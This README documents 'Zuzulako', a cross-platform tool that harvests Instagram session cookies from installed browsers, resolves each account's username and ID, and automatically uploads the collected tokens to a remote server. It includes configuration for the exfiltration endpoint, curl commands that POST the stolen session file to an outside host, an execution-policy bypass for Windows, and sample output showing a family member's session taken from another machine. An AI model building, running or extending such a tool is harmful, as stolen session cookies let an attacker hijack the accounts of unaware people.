# Zuzulako

A cross-platform Instagram session extractor. It scans installed browsers on any machine for an active Instagram session cookie, resolves the account details, stores them locally in a structured JSON file, and uploads the file to a configured server endpoint.

Designed to work across Linux and Windows with zero manual cookie hunting.

---

## How It Works

1. Detects the current operating system
2. Iterates through all supported browsers and checks for an Instagram `sessionid` cookie
3. Uses the extracted cookie to hit the Instagram internal API and resolve the username and user ID
4. Writes the result into `session_store.json` — appending without overwriting existing entries
5. Uploads the JSON file to a configured endpoint via a multipart POST request

The Python logic is fully embedded inside the shell/PowerShell scripts — no separate `.py` file is required.

---

## Supported Browsers

| Browser | Linux | Windows |
|---|---|---|
| Chrome | Yes | Yes |
| Firefox | Yes | Yes |
| Brave | Yes | Yes |
| Edge | Yes | Yes |
| Opera | Yes | Yes |
| Safari | No | No |

If multiple browsers have an active Instagram session, the first one found is used and the rest are logged to the console.

---

## Requirements

| Requirement | Notes |
|---|---|
| Python 3 | Must be installed and in PATH |
| pip | Must be available as `pip` or `pip3` |
| Instagram session | Must be logged in on at least one supported browser |
| Network access | Required to resolve username via Instagram API and to upload |

---

## Dependencies

Installed automatically by the script:

```
browser-cookie3
requests
```

---

## Files

```
zuzulako/
├── README.md
├── install_run.sh       # Linux / macOS
└── install_run.ps1      # Windows
```

---

## Configuration

Set the upload endpoint at the top of each script before running:

**Linux (`install_run.sh`):**
```bash
EDITH_UPLOAD_URL="http://<server-ip>:9090/upload"
```

**Windows (`install_run.ps1`):**
```powershell
$EDITH_UPLOAD_URL = "http://<server-ip>:9090/upload"
```

Replace `<server-ip>` with the actual IP or hostname of your server.

---

## Installation and Usage

### Linux

```bash
# Make executable
chmod +x install_run.sh

# Run
./install_run.sh
```

### Windows

Open PowerShell as Administrator, then:

```powershell
# Allow script execution for this session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Run
.\install_run.ps1
```

---

## Output — session_store.json

Generated in the same directory as the script.

```json
{
  "dev0root": {
    "username": "dev0root",
    "user_id": "123456789",
    "sessionid": "abc123xyz...",
    "browser": "brave",
    "os": "Linux",
    "machine": "arch-box"
  },
  "moms_username": {
    "username": "moms_username",
    "user_id": "987654321",
    "sessionid": "xyz789abc...",
    "browser": "chrome",
    "os": "Windows",
    "machine": "DESKTOP-MOM"
  }
}
```

Each entry is keyed by Instagram username. If the username cannot be resolved via API, the key falls back to `machinename_browsername`.

Multiple runs append new entries without overwriting existing ones.

---

## Upload API

The script automatically fires a multipart POST request on completion.

**Request format:**
```
POST http://<server-ip>:9090/upload
  file      → session_store.json (multipart file)
  message   → "<MACHINE> (<OS>)"
  os_name   → OS name string
```

---

## Curl Demo

**Linux — manual trigger:**
```bash
curl -X POST \
  -F "file=@/full/path/to/session_store.json" \
  -F "message=arch-box (Linux)" \
  -F "os_name=Linux" \
  http://<server-ip>:9090/upload
```

**Windows — manual trigger:**
```powershell
curl.exe -X POST `
  -F "file=@C:\path\to\session_store.json" `
  -F "message=DESKTOP-MOM (Windows)" `
  -F "os_name=Windows" `
  http://<server-ip>:9090/upload
```

**Test server connectivity:**
```bash
curl http://<server-ip>:9090/upload
```

**Expected success response:**
```json
{
  "status": "ok",
  "message": "File received"
}
```

---

## Notes

- Sessions expire if you log out of Instagram on the browser — re-run the script to refresh
- Run once per machine per account
- The script tries Chrome first, then Firefox, Brave, Edge, Opera in order
- If Instagram API is unreachable, the entry is still saved using machine and browser name as the key

---

## License

MIT License

Copyright (c) 2026 dev0root

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
